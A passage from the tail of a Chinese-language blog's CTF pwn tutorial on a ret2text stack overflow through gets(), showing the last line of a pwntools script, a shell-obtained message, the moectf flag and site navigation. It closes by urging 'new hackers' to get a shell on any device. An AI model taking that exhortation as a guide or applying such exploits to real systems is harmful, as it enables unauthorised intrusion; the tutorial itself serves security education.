class="comment"># 若不想要发送多余的换行符，可以使用send()方法</span></span><br><span class="line">p.interactive()     <span class="comment"># 程序进入interactive模式，即进入我们与程序直接交互的界面</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>成功get shell</strong></p>
+<p><img src="https://i.loli.net/2020/09/19/gaKMp2WFLs8coRJ.png" alt="image.png"></p>
+<p>至此，我们已经完成了<strong>从0开始利用gets()函数的栈溢出漏洞获取最高权限的整个过程</strong>，接下来就该靠你自己的努力，去分析、利用每一个可以被利用的系统漏洞，夺取最高权限了</p>
+<p><strong>为了拥有“能够getshell任意一台设备”的能力而努力吧！新生代的黑客们！</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;PWN_T0_0WN!&#125;</span><br></pre></td></tr></table></figure>
+</div><div class="article-licensing box"><div class="licensing-title"><p>Pwn从入门到入狱</p><p><a href="https://xeonds.github.io/2021/07/08/计算机科学/Pwn从入门到入狱/">https://xeonds.github.io/2021/07/08/计算机科学/Pwn从入门到入狱/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>XDU</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2021-07-08</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2023-05-23</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Pwn/">Pwn</a></div><div class="sharethis-inline-share-buttons"></div><script src="https://xeonds.github.io/" defer></script></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/Crypto%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">Crypto入门指北</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E5%85%B3%E4%BA%8E%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"><span class="level-item">关于设计模式</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.jpg" alt="xeonds"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">xeonds</p><p class="is-size-6 is-block">Enjoy creating.</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Solaris, Earth</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">124</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">30</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">61</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/xeonds" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/xeonds"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#Pwn从入门到入狱"><span class="level-left"><span class="level-item">1</span><span class="level-item">Pwn从入门到入狱</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#简介：什么是Pwn？"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">简介：什么是Pwn？</span></span></a></li><li><a class="level is-mobile" href="#预备知识"><span class="level-left"><span class="level-item">1.2</span><span class="level-item">预备知识</span></span></a></li><li><a class="level is-mobile" href="#Pwn的解题过程？"><span class="level-left"><span class="level-item">1.3</span><span class="level-item">Pwn的解题过程？</span></span></a></li><li><a class="level is-mobile" href="#0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text"><span class="level-left"><span class="level-item">1.4</span><span class="level-item">0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#以下内容操作环境位于Linux"><span class="level-left"><span class="level-item">1.4.1</span><span class="level-item">以下内容操作环境位于Linux</span></span></a></li><li><a class="level is-mobile" href="#以下内容操作环境位于Windows"><span class="level-left"><span class="level-item">1.4.2</span><span class="level-item">以下内容操作环境位于Windows</span></span></a></li><li><a class="level is-mobile" href="#F5键：使用IDA进行逆向分析的神器"><span class="level-left"><span class="level-item">1.4.3</span><span class="level-item">F5键：使用IDA进行逆向分析的神器</span></span></a></li><li><a class="level is-mobile" href="#以下内容操作环境位于Linux-1"><span class="level-left"><span class="level-item">1.4.4</span><span class="level-item">以下内容操作环境位于Linux</span></span></a></li></ul></li></ul></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-03-20T11:51:19.000Z">2023-03-20</time></p><p class="title"><a href="/2023/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Linux/Linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">Linux命令行工具学习笔记</a></p><p class="categories"><a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/">计算机科学</a> / <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a> / <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Linux/">Linux</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-03-17T00:34:19.000Z">2023-03-17</time></p><p class="title"><a href="/2023/03/17/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E8%AE%A1%E7%BB%84%E7%AC%94%E8%AE%B0%EF%BC%9A%E7%AC%AC%E4%B8%89%E7%AB%A0-%E8%BF%90%E7%AE%97%E6%96%B9%E6%B3%95%E5%92%8C%E8%BF%90%E7%AE%97%E5%99%A8/">计组笔记：第三章-运算方法和运算器</a></p><p class="categories"><a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/">计算机科学</a> / <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/">计算机组成原理</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-03-16T15:12:16.000Z">2023-03-16</time></p><p class="title"><a href="/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/GDB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">GDB学习笔记</a></p><p class="categories"><a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/">计算机科学</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-03-13T13:06:51.000Z">2023-03-13</time></p><p class="title"><a href="/2023/03/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/Linux%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E6%9C%8D%E5%8A%A1/">Linux添加自定义服务</a></p><p class="categories"><a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/">计算机科学</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-02-21T09:15:55.000Z">2023-02-21</time></p><p class="title"><a href="/2023/02/21/%E6%95%B0%E5%AD%A6/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/%E7%AC%AC%E4%BA%94%E7%AB%A0%EF%BC%9A%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1%E5%88%9D%E6%AD%A5/">第五章：数理统计初步</a></p><p class="categories"><a href="/categories/%E6%95%B0%E5%AD%A6/">数学</a> / <a href="/categories/%E6%95%B0%E5%AD%A6/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/">概率论与数理统计</a></p></div></article></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/favicon.ico" alt="神社的储物间" height="28"></a><p class="is-size-7"><span>&copy; 2023 XDU</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">共<span id="busuanzi_value_site_uv">0</span>个访客</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "此网站使用Cookie来改善您的体验。",
+          dismiss: "知道了！",
+          allow: "允许使用Cookie",
+          deny: "拒绝",
+          link: "了解更多",
+          policy: "Cookie政策",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/mhchem.min.js" defer></script><script>window.addEventListener("load", function() {
+            document.querySelectorAll('[role="article"] > .content').forEach(function(element) {
+                renderMathInElement(element);
+            });
+        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
